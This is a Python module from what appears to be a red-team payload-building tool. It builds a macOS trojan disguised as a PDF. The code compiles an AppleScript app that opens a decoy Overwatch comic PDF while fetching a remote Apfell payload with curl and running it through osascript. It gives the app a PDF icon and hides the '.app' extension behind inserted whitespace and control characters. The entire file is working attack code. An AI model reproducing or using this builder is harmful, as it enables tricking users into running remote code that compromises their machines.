# https://null-byte.wonderhowto.com/how-to/hacking-macos-create-fake-pdf-trojan-with-applescript-part-2-disguising-script-0184706/
import os
import shutil
import asyncio
from .Utilities import *


def pdf():
    temp = "./Templates/PDF/"
    payload = "./Payloads/PDF_Payload"
    print("!!! This module currently downloads a pdf to modify as a default example")
    realpdf = "https://assets.blz-contentstack.com/v3/assets/blt2477dcaf4ebd440c/blt193f89e1010ef25b/5d02e207a812cef40914a4dc/comic-overwatch-masquerade_en-us.pdf"  # Can be replaced with any pdf

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="PDF Trojan",
                                                     filename="PDF_Payload.js",
                                                     include_all_commands=True)
        print("[*] Building PDF Payload")
        url = await get_payload_download_url(payload_info)

        os.system(
            "curl https://assets.blz-contentstack.com/v3/assets/blt2477dcaf4ebd440c/blt193f89e1010ef25b/5d02e207a812cef40914a4dc/comic-overwatch-masquerade_en-us.pdf -o " + payload + "/doomfist.pdf")

        fin = open("./Payloads/PDF_Payload/script.txt", "w")
        data = 'do shell script "curl -s ' + realpdf + ' | open -f -a Preview.app & curl -k ' + url + ' | osascript -l JavaScript &"'
        fin.write(data)
        fin.close()

        os.system("/usr/bin/osacompile -o Payloads/PDF_Payload/test.app Payloads/PDF_Payload/script.txt")
        os.system("bash Payloads/PDF_Payload/convert.sh Payloads/PDF_Payload/doomfist.pdf applet")

        shutil.copyfile(payload + "/applet.icns", payload + "/test.app/Contents/Resources/applet.icns")
        shutil.copyfile(payload + "/Info.plist", payload + "/test.app/Contents/Info.plist")

        a = "Payloads/PDF_Payload/Doomfist.pdf" + bytes.fromhex('20').decode('utf-8') + bytes.fromhex('10').decode('utf-8') + ".app"
        shutil.copytree("Payloads/PDF_Payload/test.app", a)
        

        print("[+] Built 'PDF' application as Doomfist.pdf")
        print("Notes: \n"
              "1) The created pdf file downloads the legit pdf to open and present to the user  \n"
              "2) After which the hosted payload is downloaded and executed")

    async def main():
        await scripting()

    asyncio.run(main())
